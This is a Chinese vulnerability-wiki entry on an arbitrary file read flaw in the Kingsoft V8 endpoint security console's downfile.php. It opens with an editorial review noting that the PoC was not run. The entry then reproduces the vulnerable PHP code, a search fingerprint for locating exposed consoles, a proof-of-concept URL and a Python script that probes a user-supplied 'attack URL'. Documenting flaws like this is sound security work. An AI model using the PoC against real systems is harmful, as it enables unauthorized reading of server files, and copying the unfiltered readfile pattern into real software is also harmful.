---
version: "金山 V8 终端安全系统"
source: "Threekiii/Vulnerability-Wiki"
id: "vw-ed06dc7469b4e262b61eb357"
entity_id: "ve-ed06dc7469b4e262b61eb357"
schema_version: "1"
title: "金山 V8 终端安全系统 downfile.php 任意文件读取漏洞"
product: "金山V8终端安全"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "变量来自GET、服务权限，具体V8构建未知"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E9%87%91%E5%B1%B1%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8/%E9%87%91%E5%B1%B1-V8-%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F-downfile.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
source_status: "unknown"
---

# 金山 V8 终端安全系统 downfile.php 任意文件读取漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：金山V8终端安全
- 本文讨论：htmltopdf/downfile.php filename不受限readfile
- 版本、权限与配置前提：变量来自GET、服务权限，具体V8构建未知
- 资料类型：downfile读取源码与PoC；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 脚本$filename+200匹配较弱，需确认确为源码而非错误/反射
- Console磁盘路径与外部URL映射未解释；无修复版
- 与651同原稿但源码/字符串完整

### 操作风险与恢复

- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本

### 待核与来源

- 匿名鉴权、文件读取范围与官方补丁待核
- 引用图片未查看，截图内容及有效性待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


## 漏洞描述

金山 V8 终端安全系统 存在任意文件读取漏洞，攻击者可以通过漏洞下载服务器任意文件

## 漏洞影响

```
金山 V8 终端安全系统
```

## 网络测绘

```
title="在线安装-V8+终端安全系统Web控制台"
```

## 漏洞复现


存在漏洞的文件 **/Console/htmltopdf/downfile.php**


```php
<?php	
			$filename= $_GET["filename"];
            
			$filename=iconv("UTF-8","GBK//IGNORE", $filename);

   			header("Cache-Control: public"); 
			header("Content-Description: File Transfer"); 
			header('Content-disposition: attachment; filename='.$filename); //文件名   
			header("Content-Type: application/zip"); //zip格式的   
			header("Content-Transfer-Encoding: binary"); //告诉浏览器，这是二进制文件    
			header('Content-Length: '. filesize($filename)); //告诉浏览器，文件大小   
			@readfile($filename);
			?>
```


文件中没有任何的过滤 通过filename参数即可下载任意文件


POC为


```plain
http://xxx.xxx.xxx.xxx/htmltopdf/downfile.php?filename=downfile.php
```


![](./.resource/金山-V8-终端安全系统-downfile.php-任意文件读取漏洞/media/202202091833924.png)


## 漏洞POC


```python
import requests
import sys
import random
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号  : PeiQi文库                                                   \033[0m')
    print('+  \033[34mTitle  : 金山 V8 终端安全系统 任意文件读取漏洞                          \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         >>> http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    vuln_url = target_url + "/htmltopdf/downfile.php?filename=downfile.php"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    try:
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
        if "$filename" in response.text and response.status_code == 200:
            print("\033[32m[o] 目标 {} 存在漏洞 , 响应为:\n{} \033[0m".format(target_url, response.text))
        else:
            print("\033[31m[x] 不存在漏洞 \033[0m")
            sys.exit(0)
    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)


if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl >>> \033[0m"))
    POC_1(target_url)
```


![](./.resource/金山-V8-终端安全系统-downfile.php-任意文件读取漏洞/media/202202091833854.png)


---

> 来源：Threekiii/Vulnerability-Wiki（https://github.com/Threekiii/Vulnerability-Wiki）
